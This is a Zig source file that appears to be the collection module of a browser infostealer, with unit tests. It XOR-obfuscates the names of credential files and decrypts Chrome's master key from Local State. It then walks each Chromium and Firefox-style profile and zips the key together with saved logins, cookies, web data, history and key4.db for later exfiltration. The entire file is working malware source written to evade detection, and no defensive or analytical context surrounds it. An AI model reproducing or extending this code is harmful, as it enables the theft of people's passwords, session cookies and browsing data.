const std = @import("std");
const file_io = @import("../parsers/file_io.zig");
const chrome_key = @import("../crypto/chrome_key.zig");
const chrome_crypto = @import("../crypto/chrome_crypto.zig");
const browser_paths = @import("chromium_paths.zig");
const hash = @import("../types/hash.zig");
const zip_mod = @import("../network/zip.zig");

pub const SspResult = struct {
    archive: []const u8,
    chromium_count: usize,
    gecko_count: usize,
};

const E = struct {
    pub const local_state = hash.xorEncrypt("Local State");
    pub const default_profile = hash.xorEncrypt("Default");
    pub const profile_prefix = hash.xorEncrypt("Profile ");
    pub const chromium_files = [4][]const u8{
        hash.xorEncrypt("Login Data"),
        hash.xorEncrypt("Cookies"),
        hash.xorEncrypt("Web Data"),
        hash.xorEncrypt("History"),
    };
    pub const master_key_name = hash.xorEncrypt("master_key.bin");
    pub const gecko_files = [4][]const u8{
        hash.xorEncrypt("logins.json"),
        hash.xorEncrypt("key4.db"),
        hash.xorEncrypt("cookies.sqlite"),
        hash.xorEncrypt("places.sqlite"),
    };
};

fn dirExists(path: []const u8) bool {
    var dir = std.fs.openDirAbsolute(path, .{}) catch return false;
    dir.close();
    return true;
}

fn findProfileDirs(allocator: std.mem.Allocator, base_path: []const u8) ![][]const u8 {
    var profiles = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (profiles.items) |p| allocator.free(p);
        profiles.deinit();
    }

    var def_buf: [E.default_profile.len]u8 = undefined;
    hash.xorDecrypt(&E.default_profile, &def_buf);
    const default_path = try std.fs.path.join(allocator, &[_][]const u8{ base_path, def_buf[0..] });
    if (dirExists(default_path)) {
        try profiles.append(default_path);
    } else {
        allocator.free(default_path);
    }

    var prefix_buf: [E.profile_prefix.len]u8 = undefined;
    hash.xorDecrypt(&E.profile_prefix, &prefix_buf);

    var i: usize = 1;
    while (true) : (i += 1) {
        const profile_name = try std.fmt.allocPrint(allocator, "{s}{d}", .{ prefix_buf[0..], i });
        const profile_path = try std.fs.path.join(allocator, &[_][]const u8{ base_path, profile_name });
        allocator.free(profile_name);
        if (dirExists(profile_path)) {
            try profiles.append(profile_path);
        } else {
            allocator.free(profile_path);
            break;
        }
    }

    return profiles.toOwnedSlice();
}

fn copyToZip(zip: *zip_mod.ZipWriter, source_path: []const u8, archive_name: []const u8) void {
    const mapped = file_io.MappedFile.open(source_path) orelse return;
    defer mapped.close();
    zip.addFile(archive_name, mapped.slice()) catch return;
}

pub fn collect(
    allocator: std.mem.Allocator,
    local_app_data: []const u8,
    roaming_app_data: []const u8,
) !SspResult {
    var zip = try zip_mod.ZipWriter.init(allocator);
    errdefer zip.deinit();

    var chromium_count: usize = 0;
    var gecko_count: usize = 0;

    var chromium_files_bufs: [4][64]u8 = undefined;
    var chromium_files: [4][]const u8 = undefined;
    inline for (E.chromium_files, 0..) |ef, i| {
        hash.xorDecrypt(&ef, &chromium_files_bufs[i]);
        chromium_files[i] = chromium_files_bufs[i][0..ef.len];
    }

    var master_key_name_buf: [E.master_key_name.len]u8 = undefined;
    hash.xorDecrypt(&E.master_key_name, &master_key_name_buf);
    const master_key_name = master_key_name_buf[0..];

    var local_state_buf: [E.local_state.len]u8 = undefined;
    hash.xorDecrypt(&E.local_state, &local_state_buf);
    const local_state_str = local_state_buf[0..];

    var gecko_files_bufs: [4][64]u8 = undefined;
    var gecko_files: [4][]const u8 = undefined;
    inline for (E.gecko_files, 0..) |ef, i| {
        hash.xorDecrypt(&ef, &gecko_files_bufs[i]);
        gecko_files[i] = gecko_files_bufs[i][0..ef.len];
    }

    const chromium_browsers = browser_paths.getChromiumBrowsers();
    for (chromium_browsers) |browser| {
        const app_data = if (browser.use_roaming) roaming_app_data else local_app_data;
        const base_path = std.fs.path.join(allocator, &[_][]const u8{ app_data, browser.path_suffix }) catch continue;
        defer allocator.free(base_path);

        if (!dirExists(base_path)) continue;

        const local_state_path = std.fs.path.join(allocator, &[_][]const u8{ base_path, local_state_str }) catch continue;
        defer allocator.free(local_state_path);

        const local_state = file_io.MappedFile.open(local_state_path) orelse continue;
        defer local_state.close();
        const json = local_state.slice();

        var b64_buf: [4096]u8 = undefined;
        const encrypted_key = chrome_key.extractEncryptedKey(json, &b64_buf) orelse continue;

        var key_decrypt_buf: [256]u8 = undefined;
        const master_key_slice = chrome_crypto.decryptEncryptedKey(encrypted_key, &key_decrypt_buf) orelse continue;

        const profile_dirs = findProfileDirs(allocator, base_path) catch continue;
        defer {
            for (profile_dirs) |p| allocator.free(p);
            allocator.free(profile_dirs);
        }

        for (profile_dirs) |profile_path| {
            const profile_name = std.fs.path.basename(profile_path);
            var key_dest_buf: [256]u8 = undefined;
            const key_dest_path = std.fmt.bufPrint(&key_dest_buf, "{s}/{s}/{s}", .{ browser.name, profile_name, master_key_name }) catch continue;
            zip.addFile(key_dest_path, master_key_slice) catch continue;

            for (chromium_files) |file_name| {
                var src_buf: [512]u8 = undefined;
                const src_path = std.fmt.bufPrint(&src_buf, "{s}\\{s}", .{ profile_path, file_name }) catch continue;

                var arc_buf: [512]u8 = undefined;
                const arc_name = std.fmt.bufPrint(&arc_buf, "{s}/{s}/{s}", .{ browser.name, profile_name, file_name }) catch continue;

                copyToZip(&zip, src_path, arc_name);
            }

            chromium_count += 1;
        }
    }

    const gecko_browsers = browser_paths.getGeckoBrowsers();
    for (gecko_browsers) |browser| {
        const base_path = std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, browser.path_suffix }) catch continue;
        defer allocator.free(base_path);

        if (!dirExists(base_path)) continue;

        const profile_dirs = findProfileDirs(allocator, base_path) catch continue;
        defer {
            for (profile_dirs) |p| allocator.free(p);
            allocator.free(profile_dirs);
        }

        for (profile_dirs) |profile_path| {
            const profile_name = std.fs.path.basename(profile_path);

            for (gecko_files) |file_name| {
                var src_buf: [512]u8 = undefined;
                const src_path = std.fmt.bufPrint(&src_buf, "{s}\\{s}", .{ profile_path, file_name }) catch continue;

                var arc_buf: [512]u8 = undefined;
                const arc_name = std.fmt.bufPrint(&arc_buf, "{s}/{s}/{s}", .{ browser.name, profile_name, file_name }) catch continue;

                copyToZip(&zip, src_path, arc_name);
            }

            gecko_count += 1;
        }
    }

    const archive = try zip.finalize();
    return SspResult{
        .archive = archive,
        .chromium_count = chromium_count,
        .gecko_count = gecko_count,
    };
}

test "ssp collect returns result for nonexistent paths" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__local__", "C:\\__nonexistent__roaming__");
    defer std.testing.allocator.free(result.archive);
    try std.testing.expectEqual(@as(usize, 0), result.chromium_count);
    try std.testing.expectEqual(@as(usize, 0), result.gecko_count);
    try std.testing.expect(result.archive.len > 0);
}

test "ssp collect archive has valid ZIP header" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__local__", "C:\\__nonexistent__roaming__");
    defer std.testing.allocator.free(result.archive);
    try std.testing.expectEqual(@as(u32, 0x04034B50), std.mem.readInt(u32, result.archive[0..4], .little));
    try std.testing.expectEqual(@as(u32, 0x06054B50), std.mem.readInt(u32, result.archive[result.archive.len - 22 ..][0..4], .little));
}

test "dirExists returns false for nonexistent path" {
    try std.testing.expect(!dirExists("C:\\__nonexistent__dir__ssp_test__"));
}
